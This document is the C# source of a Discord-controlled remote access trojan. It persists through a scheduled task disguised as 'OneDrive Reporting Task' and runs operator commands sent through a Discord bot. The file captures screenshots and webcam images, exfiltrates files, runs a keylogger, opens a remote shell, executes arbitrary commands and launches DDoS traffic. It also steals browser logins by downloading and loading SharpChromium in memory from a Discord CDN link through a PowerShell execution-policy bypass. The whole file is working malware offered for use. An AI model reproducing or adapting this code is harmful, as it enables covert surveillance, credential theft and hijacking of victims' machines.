using System;
using System.Drawing;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Net.Http;
using System.Globalization;
using System.Management;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using AForge.Video.DirectShow;
using AForge.Video;

namespace payload
{
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private static DiscordSocketClient client;
        private static string prefix;
        private static string keylog = string.Empty;
        private static bool logkeys = false;
        private static bool ddos = false;
        private static string toddos = string.Empty;

        private static List<string> geolock = new List<string>();

        public static List<Shell> shells = new List<Shell>();

        static void Main(string[] args)
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-noprofile -executionpolicy bypass -command \"[System.Diagnostics.Process]::GetProcessById({Process.GetCurrentProcess().Id}).WaitForExit(); schtasks /run /i /tn 'OneDrive Reporting Task'\"",
                WindowStyle = ProcessWindowStyle.Hidden
            });

            string token = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
            if (Uri.IsWellFormedUriString(token, UriKind.Absolute))
            {
                WebClient wc = new WebClient();
                token = Encoding.UTF8.GetString(Convert.FromBase64String(wc.DownloadString(token)));
                wc.Dispose();
            }
            prefix = args[1];
            if (args[2] != string.Empty) foreach (string item in args[2].Split(',')) geolock.Add(item.ToLower().Trim());

            if (Geocheck()) Uninfect();
            SetProcessDPIAware();
            try { Process.EnterDebugMode(); } catch { }

            new Thread(() =>
            {
                while (true)
                {
                    if (logkeys)
                    {
                        for (int i = 0; i < 255; i++)
                        {
                            int key = GetAsyncKeyState(i);
                            if (key == 1 || key == -32767)
                            {
                                keylog += (Keys)i + " ";
                            }
                        }
                    }
                    Thread.Sleep(1);
                }
            }).Start();

            new Thread(() =>
            {
                HttpClient hc = new HttpClient();
                while (true)
                {
                    if (ddos) hc.GetAsync(toddos).GetAwaiter().GetResult();
                    Thread.Sleep(1000);
                }
            }).Start();

            client = new DiscordSocketClient();
            client.MessageReceived += MessageReceived;
            client.LoginAsync(TokenType.Bot, token).GetAwaiter().GetResult();
            client.StartAsync().GetAwaiter().GetResult();

            Thread.Sleep(-1);
        }

        private static bool Geocheck()
        {
            if (geolock.Count > 0)
            {
                WebClient wc = new WebClient();
                string country = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={wc.DownloadString("https://api.ipify.org/?format=txt")}"))["country_name"];
                wc.Dispose();

                if (!geolock.Contains(country.ToLower()) || !geolock.Contains(CultureInfo.CurrentCulture.EnglishName.ToLower())) return true;
                return false;
            }
            return false;
        }

        private static async Task MessageReceived(SocketMessage message)
        {
            if (message.Author.Id == client.CurrentUser.Id) return;
            if (message.Reference != null)
            {
                foreach (Shell s in shells)
                {
                    if (s.shmessage.Id == message.Reference.MessageId.Value)
                    {
                        s.SendCommand(message.Content);
                        await message.DeleteAsync();
                        return;
                    }
                }
            }
            if (!message.Content.StartsWith(prefix)) return;

            List<string> args = new List<string>(message.Content.Split(' '));
            string cmd = args[0].Remove(0, prefix.Length);
            args.RemoveAt(0);

            switch (cmd)
            {
                case "get":
                    {
                        string address = string.Empty;
                        string location = string.Empty;
                        try
                        {
                            // Sometimes fails, currently unsure what causes this.
                            WebClient wc = new WebClient();
                            address = wc.DownloadString("https://api.ipify.org");
                            location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
                            wc.Dispose();
                        }
                        catch { }

                        await message.Channel.SendMessageAsync($"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}\nIP address: {address}\nIP location: {location}");
                        break;
                    }
                case "getsc":
                    {
                        if (args[0] != Environment.MachineName) break;
                        List<FileAttachment> screenshots = new List<FileAttachment>();
                        foreach (Screen screen in Screen.AllScreens)
                        {
                            Bitmap sc = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                            Graphics sg = Graphics.FromImage(sc);
                            sg.CopyFromScreen(0, 0, 0, 0, sc.Size, CopyPixelOperation.SourceCopy);
                            sg.Dispose();

                            MemoryStream ms = new MemoryStream();
                            sc.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                            sc.Dispose();

                            screenshots.Add(new FileAttachment(ms, "unknown.png"));
                        }
                        await message.Channel.SendFilesAsync(screenshots);
                        foreach (FileAttachment fa in screenshots) fa.Dispose();
                        break;
                    }
                case "getcam":
                    {
                        if (args[0] != Environment.MachineName) break;
                        List<Bitmap> images = new List<Bitmap>();
                        FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        foreach (FilterInfo device in devices)
                        {
                            VideoCaptureDevice vsource = new VideoCaptureDevice(device.MonikerString);
                            vsource.NewFrame += new NewFrameEventHandler((sender, e) => { images.Add((Bitmap)e.Frame.Clone()); vsource.SignalToStop(); });
                            vsource.Start();
                            for (int i = 0; i < 10; i++) if (vsource.IsRunning) Thread.Sleep(100);
                        }
                        List<FileAttachment> pictures = new List<FileAttachment>();
                        foreach (Bitmap image in images)
                        {
                            MemoryStream ms = new MemoryStream();
                            image.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                            image.Dispose();
                            pictures.Add(new FileAttachment(ms, "unknown.png"));
                        }
                        await message.Channel.SendFilesAsync(pictures);
                        foreach (FileAttachment fa in pictures) fa.Dispose();
                        break;
                    }
                case "getfile":
                    {
                        if (args[0] != Environment.MachineName) break;
                        args.RemoveAt(0);
                        string filepath = string.Join(" ", args);

                        MemoryStream compressed = new MemoryStream();
                        ZipArchive archive = new ZipArchive(compressed, ZipArchiveMode.Create, true);
                        ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(filepath), CompressionLevel.Optimal);

                        Stream entrystream = entry.Open();
                        MemoryStream filestream = new MemoryStream(File.ReadAllBytes(filepath));
                        filestream.CopyTo(entrystream);
                        filestream.Dispose();
                        archive.Dispose();

                        if (compressed.Length > 8000000) await message.Channel.SendMessageAsync("File too big.");
                        else await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
                        compressed.Dispose();
                        entrystream.Dispose();
                        break;
                    }
                case "getav":
                    {
                        if (args[0] != Environment.MachineName) break;
                        ManagementObjectSearcher searcher = new ManagementObjectSearcher($"\\\\{Environment.MachineName}\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
                        List<string> instances = searcher.Get().Cast<ManagementObject>().Select(x => (string)x.GetPropertyValue("displayName")).ToList();
                        await message.Channel.SendMessageAsync($"Installed antivirus products:\n```{string.Join("\n", instances)}```");
                        searcher.Dispose();
                        break;
                    }
                case "getlogins":
                    {
                        if (args[0] != Environment.MachineName) break;
                        Process cmdproc = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = "powershell.exe",
                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/966985823138496542/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                Verb = "runas"
                            }
                        };
                        cmdproc.Start();
                        string output = cmdproc.StandardOutput.ReadToEnd();
                        cmdproc.WaitForExit();

                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
                        await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
                        ms.Dispose();
                        break;
                    }

                case "shell":
                    {
                        if (args[0] != Environment.MachineName) break;
                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                        shells.Add(s);
                        s.Start();
                        break;
                    }
                case "command":
                    {
                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
                        args.RemoveAt(0);
                        string command = string.Join(" ", args);

                        Process cmdproc = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c " + command,
                                UseShellExecute = false,
                                Verb = "runas"
                            }
                        };
                        cmdproc.Start();
                        cmdproc.WaitForExit();
                        await message.Channel.SendMessageAsync($"Command executed on {Environment.MachineName}");
                        break;
                    }


                case "startkeylogger":
                    {
                        if (args[0] != Environment.MachineName) break;
                        logkeys = true;
                        await message.Channel.SendMessageAsync($"Keylogger started on {Environment.MachineName}");
                        break;
                    }
                case "stopkeylogger":
                    {
                        if (args[0] != Environment.MachineName) break;
                        logkeys = false;
                        await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                        break;
                    }
                case "getkeylog":
                    {
                        if (args[0] != Environment.MachineName) break;
                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
                        await message.Channel.SendFileAsync(ms, "unknown.txt");
                        ms.Dispose();
                        keylog = string.Empty;
                        break;
                    }


                case "startddos":
                    {
                        ddos = true;
                        toddos = args[1];
                        await message.Channel.SendMessageAsync($"DDOS started on all machines.");
                        break;
                    }
                case "stopddos":
                    {
                        ddos = false;
                        toddos = string.Empty;
                        await message.Channel.SendMessageAsync($"DDOS stopped on all machines.");
                        break;
                    }


                case "uninfect":
                    {
                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
                        await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
                        Uninfect();
                        break;
                    }
            }
        }

        private static void Uninfect()
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            Process.Start(new ProcessStartInfo()
            {
                FileName = "taskkill.exe",
                Arguments = "/f /im powershell.exe",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(1);
        }
    }
}